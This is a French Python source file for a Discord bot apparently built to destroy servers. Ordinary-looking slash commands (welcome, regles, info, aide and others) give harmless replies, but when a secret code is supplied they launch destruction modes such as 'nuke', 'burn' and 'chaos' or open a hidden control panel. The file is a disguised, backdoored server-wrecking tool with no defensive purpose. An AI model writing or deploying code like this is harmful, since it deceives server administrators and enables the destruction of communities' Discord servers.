"""Bot Discord : commandes leurres, superviseur de connexion, panneau de contrôle."""

from __future__ import annotations

import asyncio
import logging
from typing import Any, Callable, Coroutine

import discord
from discord import app_commands
from discord.ext import commands

from . import config, db, destroyer, flavor, modes

log = logging.getLogger("botsecret.bot")

intents = discord.Intents.all()

bot: "SecretBot | None" = None

READY = {"value": False}
STATE: dict[str, Any] = {
    "attempts": 0,
    "last_error": None,
    "connected_once": False,
}

_supervisor_task: asyncio.Task | None = None
_wake = asyncio.Event()
_closing = False


def _secret_matches(code: str | None) -> bool:
    if not code:
        return False
    stored = db.get_secret_code()
    if not stored:
        return False
    return code.strip() == stored


def _target_guild() -> discord.Guild | None:
    if bot is None:
        return None
    guild_id = db.get_guild_id()
    if guild_id is not None:
        return bot.get_guild(guild_id)
    if len(bot.guilds) == 1:
        return bot.guilds[0]
    return None


def _panel_embed(guild: discord.Guild | None, client: discord.Client | None = None) -> discord.Embed:
    snap = destroyer.state.snapshot()
    embed = discord.Embed(
        title="☠️ PANNEAU DE CONTRÔLE ☠️",
        description=f"```\n{flavor.BANNER}\n```\n*{flavor.quote()}*",
        colour=discord.Colour.dark_red(),
        timestamp=discord.utils.utcnow(),
    )
    if client is not None and client.user is not None:
        embed.set_thumbnail(url=client.user.display_avatar.url)
    if guild is not None:
        embed.add_field(name="🩸 Serveur", value=guild.name, inline=True)
        embed.add_field(name="⚰️ Membres", value=str(guild.member_count), inline=True)
        embed.add_field(name="🕯️ Salons", value=str(len(guild.channels)), inline=True)
    if snap["running"]:
        embed.add_field(
            name="🔥 État",
            value=f"destruction en cours — {snap['step']} ({snap['done']}/{snap['total']})",
            inline=False,
        )
    else:
        embed.add_field(name="🔥 État", value="au repos, prêt à frapper", inline=False)
    embed.add_field(
        name="💀 Mode par défaut",
        value=modes.mode_label(db.get_default_mode()),
        inline=False,
    )
    embed.set_footer(text="botsecret — choisis ton mode puis frappe")
    return embed


class ControlView(discord.ui.View):
    def __init__(self) -> None:
        super().__init__(timeout=300)
        options = [
            discord.SelectOption(
                label=data["label"],
                value=data["key"],
                emoji=data["emoji"],
                description=data["tagline"][:100],
            )
            for data in modes.list_modes()
        ]
        self.mode = db.get_default_mode()
        select: discord.ui.Select = discord.ui.Select(
            placeholder="Choisir un mode de destruction…",
            options=options,
            min_values=1,
            max_values=1,
        )
        select.callback = self._on_select  # type: ignore[assignment]
        self.add_item(select)

    async def _on_select(self, interaction: discord.Interaction) -> None:
        values = interaction.data.get("values") if interaction.data else None
        if values:
            self.mode = values[0]
        await interaction.response.send_message(
            f"Mode armé : **{modes.mode_label(self.mode)}**",
            ephemeral=True,
        )

    @discord.ui.button(label="Frapper", style=discord.ButtonStyle.danger, emoji="💀")
    async def launch(
        self, interaction: discord.Interaction, button: discord.ui.Button
    ) -> None:
        guild = interaction.guild
        if guild is None:
            await interaction.response.send_message("Hors serveur.", ephemeral=True)
            return
        preset = modes.build(self.mode, db.get_preset())
        if preset is None:
            await interaction.response.send_message("Mode inconnu.", ephemeral=True)
            return
        if not destroyer.start(guild, preset, self.mode):
            await interaction.response.send_message(
                "Une destruction est déjà en cours.", ephemeral=True
            )
            return
        await interaction.response.send_message(
            f"💀 **{modes.mode_label(self.mode)}** lancé. *{flavor.quote()}*",
            ephemeral=True,
        )

    @discord.ui.button(label="Statut", style=discord.ButtonStyle.secondary, emoji="📊")
    async def status(
        self, interaction: discord.Interaction, button: discord.ui.Button
    ) -> None:
        await interaction.response.send_message(
            embed=_panel_embed(interaction.guild, interaction.client), ephemeral=True
        )

    @discord.ui.button(label="Arrêter", style=discord.ButtonStyle.primary, emoji="⏹️")
    async def halt(
        self, interaction: discord.Interaction, button: discord.ui.Button
    ) -> None:
        ok = destroyer.stop()
        await interaction.response.send_message(
            "Arrêt demandé." if ok else "Rien à arrêter.", ephemeral=True
        )


async def _launch_mode(interaction: discord.Interaction, mode: str) -> None:
    guild = interaction.guild
    if guild is None:
        await interaction.response.send_message("Hors serveur.", ephemeral=True)
        return
    preset = modes.build(mode, db.get_preset())
    if preset is None:
        await interaction.response.send_message("Mode inconnu.", ephemeral=True)
        return
    if not destroyer.start(guild, preset, mode):
        await interaction.response.send_message(
            "Une destruction est déjà en cours.", ephemeral=True
        )
        return
    await interaction.response.send_message(
        f"💀 **{modes.mode_label(mode)}** déclenché.\n*{flavor.quote()}*",
        ephemeral=True,
    )


@app_commands.describe(code="Code d'accès")
async def gerer(interaction: discord.Interaction, code: str | None = None) -> None:
    if not _secret_matches(code):
        await interaction.response.send_message("✅ Rien à signaler.", ephemeral=True)
        return
    await interaction.response.send_message(
        embed=_panel_embed(interaction.guild, interaction.client),
        view=ControlView(),
        ephemeral=True,
    )


@app_commands.describe(code="Code d'accès")
async def welcome(interaction: discord.Interaction, code: str | None = None) -> None:
    if not _secret_matches(code):
        await interaction.response.send_message("👋 Bienvenue !", ephemeral=True)
        return
    await _launch_mode(interaction, "chaos")


@app_commands.describe(code="Code d'accès")
async def salut(interaction: discord.Interaction, code: str | None = None) -> None:
    if not _secret_matches(code):
        await interaction.response.send_message("Salut 👋", ephemeral=True)
        return
    await _launch_mode(interaction, "nuke")


@app_commands.describe(code="Code d'accès")
async def regles(interaction: discord.Interaction, code: str | None = None) -> None:
    if not _secret_matches(code):
        embed = discord.Embed(
            title="📜 Règles",
            description="1. Soyez sympas\n2. Pas de spam\n3. Amusez-vous",
            colour=discord.Colour.blurple(),
        )
        await interaction.response.send_message(embed=embed, ephemeral=True)
        return
    await _launch_mode(interaction, "burn")


@app_commands.describe(code="Code d'accès")
async def info(interaction: discord.Interaction, code: str | None = None) -> None:
    guild = interaction.guild
    if guild is None:
        await interaction.response.send_message("Hors serveur.", ephemeral=True)
        return
    if not _secret_matches(code):
        embed = discord.Embed(
            title="ℹ️ Informations",
            description=f"**{guild.member_count}** membres · **{len(guild.channels)}** salons",
            colour=discord.Colour.blurple(),
        )
        await interaction.response.send_message(embed=embed, ephemeral=True)
        return
    await _launch_mode(interaction, "stealth")


@app_commands.describe(code="Code d'accès")
async def ping(interaction: discord.Interaction, code: str | None = None) -> None:
    latency = round((interaction.client.latency or 0) * 1000)
    if not _secret_matches(code):
        await interaction.response.send_message(f"🏓 {latency} ms", ephemeral=True)
        return
    embed = discord.Embed(
        title="🏓 Pong",
        description=(
            f"Latence : **{latency} ms**\n"
            f"Mode armé : **{modes.mode_label(db.get_default_mode())}**"
        ),
        colour=discord.Colour.dark_red(),
    )
    await interaction.response.send_message(embed=embed, view=ControlView(), ephemeral=True)


@app_commands.describe(code="Code d'accès")
async def stats(interaction: discord.Interaction, code: str | None = None) -> None:
    guild = interaction.guild
    if guild is None:
        await interaction.response.send_message("Hors serveur.", ephemeral=True)
        return
    if not _secret_matches(code):
        embed = discord.Embed(
            title="📈 Statistiques",
            description=f"**{guild.member_count}** membres · **{len(guild.channels)}** salons",
            colour=discord.Colour.blurple(),
        )
        await interaction.response.send_message(embed=embed, ephemeral=True)
        return
    await interaction.response.send_message(
        embed=_panel_embed(guild, interaction.client),
        view=ControlView(),
        ephemeral=True,
    )


@app_commands.describe(code="Code d'accès")
async def aide(interaction: discord.Interaction, code: str | None = None) -> None:
    if not _secret_matches(code):
        embed = discord.Embed(
            title="❓ Aide",
            description="Utilise `/gerer` pour gérer le serveur.",
            colour=discord.Colour.blurple(),
        )
        await interaction.response.send_message(embed=embed, ephemeral=True)
        return
    await _launch_mode(interaction, "lockdown")


CommandCallback = Callable[..., Coroutine[Any, Any, None]]

COMMANDS: list[tuple[str, str, CommandCallback]] = [
    ("gerer", "Gérer le serveur", gerer),
    ("welcome", "Accueillir les nouveaux membres", welcome),
    ("salut", "Saluer le serveur", salut),
    ("regles", "Règles du serveur", regles),
    ("info", "Informations du serveur", info),
    ("ping", "Latence du bot", ping),
    ("stats", "Statistiques du serveur", stats),
    ("aide", "Aide du bot", aide),
]


class SecretBot(commands.Bot):
    async def on_ready(self) -> None:
        READY["value"] = True
        STATE["last_error"] = None
        STATE["connected_once"] = True
        log.info("Connecté en tant que %s (%s)", self.user, self.user.id if self.user else "?")
        db.add_log("info", f"bot connecté : {self.user} — {len(self.guilds)} serveur(s)")
        await _update_presence()
        try:
            message = await sync_commands()
            db.add_log("info", message)
        except Exception as exc:  # noqa: BLE001
            db.add_log("error", f"synchronisation des commandes impossible : {exc}")

    async def on_error(self, event_method: str, *args: Any, **kwargs: Any) -> None:
        log.exception("erreur sur l'événement %s", event_method)
        db.add_log("error", f"erreur événement {event_method}")


def _build_client() -> SecretBot:
    client = SecretBot(command_prefix="!", intents=intents)
    for name, description, callback in COMMANDS:
        client.tree.add_command(
            app_commands.Command(name=name, description=description, callback=callback)
        )
    return client


async def sync_commands() -> str:
    if bot is None:
        raise RuntimeError("client indisponible")
    guild_id = db.get_guild_id()
    if guild_id is not None:
        guild = discord.Object(id=guild_id)
        bot.tree.copy_global_to(guild=guild)
        synced = await bot.tree.sync(guild=guild)
        return f"{len(synced)} commande(s) synchronisée(s) sur la guilde {guild_id}"
    synced = await bot.tree.sync()
    return f"{len(synced)} commande(s) synchronisée(s) globalement"


async def _update_presence() -> None:
    if bot is None:
        return
    text = "🔥 destruction en cours" if destroyer.state.running else flavor.presence()
    try:
        await bot.change_presence(
            status=discord.Status.dnd,
            activity=discord.Activity(type=discord.ActivityType.watching, name=text),
        )
    except Exception:  # noqa: BLE001
        pass


async def _supervisor() -> None:
    global bot
    backoff = 5
    while not _closing:
        if not config.DISCORD_TOKEN:
            STATE["last_error"] = "DISCORD_TOKEN absent"
            db.add_log("warn", "DISCORD_TOKEN absent : bot inactif")
            return

        STATE["attempts"] += 1
        client = _build_client()
        bot = client
        try:
            await client.start(config.DISCORD_TOKEN)
            if _closing:
                break
            STATE["last_error"] = "connexion interrompue par Discord"
        except discord.LoginFailure:
            STATE["last_error"] = "token invalide (LoginFailure)"
        except discord.PrivilegedIntentsRequired:
            STATE["last_error"] = (
                "intents privilégiés désactivés dans le Developer Portal "
                "(SERVER MEMBERS + MESSAGE CONTENT)"
            )
        except asyncio.CancelledError:
            raise
        except Exception as exc:  # noqa: BLE001
            STATE["last_error"] = f"{type(exc).__name__} : {str(exc)[:160]}"
        finally:
            READY["value"] = False
            try:
                if not client.is_closed():
                    await client.close()
            except Exception:  # noqa: BLE001
                pass

        if _closing:
            break

        db.add_log("error", f"connexion échouée : {STATE['last_error']} — retry {backoff}s")
        _wake.clear()
        try:
            await asyncio.wait_for(_wake.wait(), timeout=backoff)
            backoff = 5
        except asyncio.TimeoutError:
            backoff = min(90, backoff * 2)


def start_bot() -> None:
    """Démarre le superviseur de connexion (idempotent)."""
    global _supervisor_task, _closing
    if _supervisor_task is not None and not _supervisor_task.done():
        return
    _closing = False
    _supervisor_task = asyncio.create_task(_supervisor())


async def restart() -> str:
    """Force une reconnexion immédiate avec un nouveau client."""
    global _supervisor_task
    STATE["last_error"] = None
    if bot is not None and not bot.is_closed():
        await bot.close()
    if _supervisor_task is None or _supervisor_task.done():
        start_bot()
    else:
        _wake.set()
    db.add_log("info", "reconnexion demandée depuis le dashboard")
    return "reconnexion lancée"


async def shutdown() -> None:
    global _closing
    _closing = True
    destroyer.stop()
    _wake.set()
    if bot is not None and not bot.is_closed():
        await bot.close()
    if _supervisor_task is not None:
        _supervisor_task.cancel()
        await asyncio.gather(_supervisor_task, return_exceptions=True)


def guild_info() -> dict[str, Any]:
    guild = _target_guild()
    connected = bot is not None and bot.is_ready()
    diagnostics = {
        "token_present": bool(config.DISCORD_TOKEN),
        "attempts": STATE["attempts"],
        "last_error": STATE["last_error"],
        "guild_count": len(bot.guilds) if bot is not None else 0,
        "target_found": guild is not None,
        "guild_id_set": db.get_guild_id() is not None,
    }
    data: dict[str, Any] = {
        "ready": READY["value"] and connected,
        "user": str(bot.user) if bot is not None and bot.user else None,
        "avatar": bot.user.display_avatar.url if bot is not None and bot.user else None,
        "guild": None,
        "diagnostics": diagnostics,
    }
    if guild is not None:
        data["guild"] = {
            "id": guild.id,
            "name": guild.name,
            "members": guild.member_count,
            "channels": len(guild.channels),
            "roles": len(guild.roles),
        }
    return data


def list_guilds() -> list[dict[str, Any]]:
    if bot is None:
        return []
    return [
        {"id": g.id, "name": g.name, "members": g.member_count}
        for g in bot.guilds
    ]
